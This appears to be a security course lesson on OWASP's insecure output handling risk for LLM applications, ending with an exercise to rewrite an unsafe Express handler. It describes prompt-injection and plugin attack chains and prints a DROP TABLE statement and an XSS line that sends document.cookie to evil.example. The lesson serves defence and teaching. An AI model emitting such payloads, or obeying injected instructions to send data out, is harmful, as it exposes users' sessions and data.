Insecure Output Handling

Why LLM Output Is a Security Boundary

Classic web security draws a bright line between code and data, and between trusted server-side logic and untrusted user input. Input validation at the boundary is the primary defense: if you scrub what comes in, what goes out is safe.

LLMs break this assumption entirely. An LLM takes validated input and synthesizes new content from it — mixing the user's words with everything the model learned during training and with any documents retrieved at runtime. The output is therefore not a processed version of the input; it is a generated artifact that the model assembled token by token from a vast, partially adversarially influenced knowledge base.

This means the output is a new security boundary. Even if the request passed every input filter you have, the response the model writes back may contain:

  • JavaScript fragments drawn from training examples of web code;
  • SQL keywords synthesized in response to a natural-language query;
  • Markdown that a browser or renderer will execute as HTML;
  • Shell commands that a plugin or agentic tool will run without question.
The input is what the user sent. The output is what the model built. They are not the same thing, and your defenses must treat them as separate attack surfaces. Validating the input does not validate the output.

OWASP defines this vulnerability as insufficient validation and sanitization of LLM-generated outputs before they reach downstream systems. Because outputs can be shaped by prompt input, attackers who control the input gain "indirect access to additional functionality" — they can coerce the model into writing content that exploits whatever system ultimately consumes that output.

Four Attack Scenarios

The OWASP specification describes four concrete attack chains. Each follows the same pattern: the attacker shapes the model's input → the model produces dangerous output → the output reaches a downstream system without validation → the exploit executes.

Scenario 1 — Plugin triggers unintended system action

An LLM application exposes a web browsing plugin. The attacker crafts a prompt that causes the LLM to generate a response invoking the plugin with a destructive command — for example, calling an admin endpoint that triggers an application shutdown. The plugin executes the request because it trusts the model's output as if it were authorised user intent.

Scenario 2 — Summariser exfiltrates data via injected instructions

A document summarisation tool is given a document that contains hidden prompt injection instructions (see Lesson 4). The instructions tell the model to encode sensitive data found earlier in the conversation and append a request to an attacker-controlled URL. The tool passes the model's output to a plugin that makes HTTP requests — and the data leaves the network.

Scenario 3 — Chat interface executes destructive SQL

A natural-language SQL interface lets users ask questions about a database in plain English. An attacker phrases a question such that the model generates DROP TABLE users; as part of its response. The application passes the raw LLM output directly to the database driver. The table is deleted.

Scenario 4 — Unsanitised output causes XSS in the browser

A chat application renders LLM responses directly as HTML. An attacker causes the model to include <script>document.location='https://evil.example/steal?c='+document.cookie</script> in its output. The browser executes the script, exfiltrating session cookies to the attacker.

A common misconception is that XSS via LLM requires a sophisticated jailbreak. In practice, many models will include JavaScript in their output simply because a user asked a coding question, or because retrieved context contained script examples. The application's failure is not the model's response — it is the decision to render that response without encoding it first.

The Zero-Trust Output Principle

The mitigation that unifies all four scenarios is a single mental model: treat every token the LLM produces as if it came from an untrusted external user, exactly as you treat HTTP request parameters.

This is the zero-trust output principle. It is not pessimism about the model; it is an accurate description of the situation. The model's output is the product of training data you did not fully control, retrieval sources you may not have audited, and prompt text that may have been shaped by an adversary. You cannot inspect the model's "intent". You can only observe what it wrote — and apply the same defenses you would apply to any untrusted string.

Analogy Untrusted source Defense applied at boundary
Classic web app HTTP request body (user input) Input validation, output encoding
LLM application LLM response (model output) Output validation, output encoding
LLM with plugins LLM response used as plugin argument Parameterised inputs, schema validation
The OWASP guidance is explicit: apply zero-trust to model output. Do not grant the model elevated trust just because it sits on your server. The data plane and the control plane are not separated in LLM systems — model text can become instructions or executable code the moment it reaches the next system.

Practical Mitigations

OWASP recommends four concrete controls, each targeting one layer of the output handling pipeline.

1. HTML-encode output before rendering

Any LLM response that will be rendered in a browser must be HTML-encoded before being written into the DOM. This converts characters like <, >, and & into their entity equivalents, preventing the browser from interpreting them as markup. Use a well-tested library function — never write your own encoder.

2. Never interpolate LLM text directly into SQL

If an LLM generates or contributes to a database query, the model's text must never be string-concatenated into a SQL statement. Use parameterised queries or prepared statements. This applies even when the model's role is to translate a natural-language question into SQL: always parse and re-parameterise the output before execution, or use a query builder that enforces parameterisation.

3. Declare and enforce content types

Set explicit Content-Type headers on every response that carries LLM output. text/plain prevents browsers from executing HTML or JavaScript in a response they expected to be plain text. This is a second layer of defense that reduces the blast radius when encoding fails.

4. Follow OWASP ASVS for downstream validation

The OWASP Application Security Verification Standard (ASVS) defines specific validation requirements for output. Apply the same ASVS validation checklist at plugin or integration layer boundaries that you would apply to any externally received data. Treat the model's output as the integration boundary — not the user's original request.

Why must LLM output be treated as untrusted even when the user's input was carefully validated?

The following pseudo-code sends an LLM response directly to the client without any output handling: 

// Insecure: raw LLM output sent straight to the browser
app.get('/chat', (req, res) => {
  const userInput = req.query.message;
  const answer    = llm.complete(userInput);
  res.send(answer);               // ← no encoding, no Content-Type
});

Rewrite this handler with proper output handling. Your answer should include:

  1. HTML encoding of the model's response before it is written into the response body.
  2. An explicit Content-Type declaration.
  3. A short comment (2–3 sentences) explaining why zero-trust applies here — even though userInput comes from a validated query parameter.
After you've written your handler, ask yourself: if an attacker embedded prompt injection instructions in an external document that the LLM retrieved during this request, would your encoding still protect the browser? What would need to fail for the XSS to succeed anyway?
